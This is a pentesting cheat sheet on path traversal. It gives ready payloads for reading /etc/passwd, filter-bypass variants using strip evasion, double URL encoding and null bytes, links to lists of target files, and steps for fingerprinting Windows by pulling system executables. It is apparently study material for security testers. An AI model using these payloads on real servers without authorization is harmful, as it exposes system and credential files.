---
title: "Path traversal"
weight: 19
description: "Explore path traversal vulnerabilities, including bypass techniques and exploitation methods. Learn how attackers use encoding, double encoding, and null bytes to access restricted files on servers."
---

# Path traversal

## General info

Consider

```html
<img src="/loadImage?filename=218.png">
```

An attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem.

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

## Bypass defenses

* Elimination (strip): `../` -> `....//`
  * Test: try to change the original request `GET /image?filename=1.jpg` to `GET /image?filename=../1.jpg`
  * If the file is loaded the code strip `../`
* Encode: `../` -> `%2e%2e%2f`
* Double-encode: `../` -> `%252e%252e%252f`
* Require to start with the expected base folder es. `/var/www/images` -> `filename=/var/www/images/../../../etc/passwd`
* Require to end with an expected file extension es. `.png` -> `filename=../../../etc/passwd%00.png`
* Others

{{< hint style=notes >}}
**Note**: On Windows, both `../` and `..\` are valid directory traversal sequences.
{{< /hint >}}

## Tips

* Don't always trust error messages
  * `GET /image?filename=/etc/passwd` -> "No such file"
    * Try to add null byte: `GET /image?filename=/etc/passwd%00`
    * Try to add null byte and extension: `GET /image?filename=/etc/passwd%00.png`
* Combine the cases:
  * Example: `....//....//....//etc/passwd%00.jpg` (strip, double-encode, null byte, whitelist extension)
  * `%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg`

## Common files

**Linux**: 
- https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt

**Windows**: 
- Short list: https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-windows-list.txt
- Long list: https://github.com/soffensive/windowsblindread/tree/master

{{< hint style=tips >}}
**Tip**: On Windows, you can also try using a different drive letter than *C:*.
{{< /hint >}}

## Identify Windows version

1. Retrieve a Microsoft executable from the target system:
- `C:/Windows/explorer.exe`
- `C:/Windows/notepad.exe`
- `C:/Windows/system32/ntoskrnl.exe`

2. Check version information:
```bash
exiftool explorer.exe

[...]
OS Version                      : 10.0
Image Version                   : 10.0
Subsystem Version               : 10.0
Subsystem                       : Windows GUI
File Version Number             : 10.0.14393.7513
Product Version Number          : 10.0.14393.7513
File Flags Mask                 : 0x003f
File Flags                      : (none)
File OS                         : Windows NT 32-bit
Object File Type                : Executable application
File Subtype                    : 0
Language Code                   : English (U.S.)
Character Set                   : Unicode
Company Name                    : Microsoft Corporation
File Description                : Windows Explorer
File Version                    : 10.0.14393.7513 (rs1_release.241021-1750)
Internal Name                   : explorer
Legal Copyright                 : © Microsoft Corporation. All rights reserved.
Original File Name              : EXPLORER.EXE
Product Name                    : Microsoft® Windows® Operating System
Product Version                 : 10.0.14393.7513
[...]
```

3. Compare the version number with the following official table: https://learn.microsoft.com/en-us/windows/win32/sysinfo/operating-system-version.

{{< hint style=tips >}}
**Tip**: Some operating systems may share the same version name (e.g., Windows 10 and Windows 11), which can make identification tricky. To accurately determine the OS version, check the build number (e.g., `14393`) and refer to this resource: https://www.gaijin.at/en/infos/windows-version-numbers.
Alternatively, you can search the product version on Google for more information.
{{< /hint >}}



## Automatic exploitation

Use intruder with this list: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep\_traversal.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep_traversal.txt)&#x20;
